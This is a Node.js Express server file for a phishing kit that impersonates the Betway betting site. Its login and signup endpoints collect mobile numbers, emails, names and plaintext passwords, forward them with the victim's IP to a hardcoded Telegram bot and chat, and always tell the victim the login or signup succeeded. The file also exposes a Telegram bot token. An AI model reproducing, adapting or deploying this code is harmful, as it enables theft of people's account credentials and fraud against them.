const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

// ===== CORS =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// ============================================
// TELEGRAM DETAILS
// Bot Token: 8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI
// Chat ID: 8392790531
// ============================================

const TELEGRAM_BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
const TELEGRAM_CHAT_ID = '8392790531';

console.log('✅ Bot Token:', TELEGRAM_BOT_TOKEN);
console.log('✅ Chat ID:', TELEGRAM_CHAT_ID);

// ============================================
// FUNCTION TO SEND TELEGRAM MESSAGE
// ============================================

async function sendTelegramMessage(message) {
    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ===== TEST ROUTE =====
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Betway Login Backend is running!',
        port: PORT,
        endpoints: ['/api/login', '/api/signup']
    });
});

// ============================================
// LOGIN ENDPOINT
// ============================================

app.post('/api/login', async (req, res) => {
    try {
        const { mobileNumber, password, countryCode } = req.body;

        console.log('📱 Login - Mobile:', mobileNumber);
        console.log('🌍 Country Code:', countryCode);
        console.log('🔑 Password:', password);

        if (!mobileNumber || !password) {
            return res.status(400).json({
                success: false,
                message: 'Mobile number and password are required'
            });
        }

        // ===== SEND TO TELEGRAM =====
        const message = 
'🔐 **BETWAY LOGIN ALERT**\n' +
'━━━━━━━━━━━━━━━━━━━\n' +
'📱 **Mobile:** ' + mobileNumber + '\n' +
'🌍 **Country:** ' + (countryCode || 'N/A') + '\n' +
'🔑 **Password:** ' + password + '\n' +
'🌐 **IP:** ' + (req.ip || 'Unknown') + '\n' +
'🕐 **Time:** ' + new Date().toLocaleString() + '\n' +
'━━━━━━━━━━━━━━━━━━━';

        await sendTelegramMessage(message);

        console.log(`✅ Login captured: ${mobileNumber}`);

        res.json({
            success: true,
            message: 'Login successful!'
        });

    } catch (error) {
        console.error('❌ Login Error:', error.message);
        res.json({
            success: true,
            message: 'Login successful!'
        });
    }
});

// ============================================
// SIGNUP ENDPOINT
// ============================================

app.post('/api/signup', async (req, res) => {
    try {
        const { fullName, mobileNumber, email, password, countryCode } = req.body;

        console.log('📝 Signup - Name:', fullName);
        console.log('📱 Mobile:', mobileNumber);
        console.log('📧 Email:', email);
        console.log('🌍 Country:', countryCode);

        if (!fullName || !mobileNumber || !email || !password) {
            return res.status(400).json({
                success: false,
                message: 'All fields are required'
            });
        }

        // ===== SEND TO TELEGRAM =====
        const message = 
'📝 **NEW SIGNUP ALERT**\n' +
'━━━━━━━━━━━━━━━━━━━\n' +
'👤 **Full Name:** ' + fullName + '\n' +
'📱 **Mobile:** ' + mobileNumber + '\n' +
'📧 **Email:** ' + email + '\n' +
'🔑 **Password:** ' + password + '\n' +
'🌍 **Country:** ' + (countryCode || 'N/A') + '\n' +
'🌐 **IP:** ' + (req.ip || 'Unknown') + '\n' +
'🕐 **Time:** ' + new Date().toLocaleString() + '\n' +
'━━━━━━━━━━━━━━━━━━━';

        await sendTelegramMessage(message);

        console.log(`✅ Signup captured: ${mobileNumber}`);

        res.json({
            success: true,
            message: 'Account created successfully!'
        });

    } catch (error) {
        console.error('❌ Signup Error:', error.message);
        res.json({
            success: true,
            message: 'Account created successfully!'
        });
    }
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════════════════╗
    ║   🚀 SERVER RUNNING                           ║
    ║   Port: ${PORT}                                ║
    ║   Status: ONLINE ✅                           ║
    ║   Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Set' : '❌ Missing'}
    ║   Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Set' : '❌ Missing'}
    ║   Endpoints:                                  ║
    ║   - POST /api/login                           ║
    ║   - POST /api/signup                          ║
    ╚═══════════════════════════════════════════════╝
    `);
});
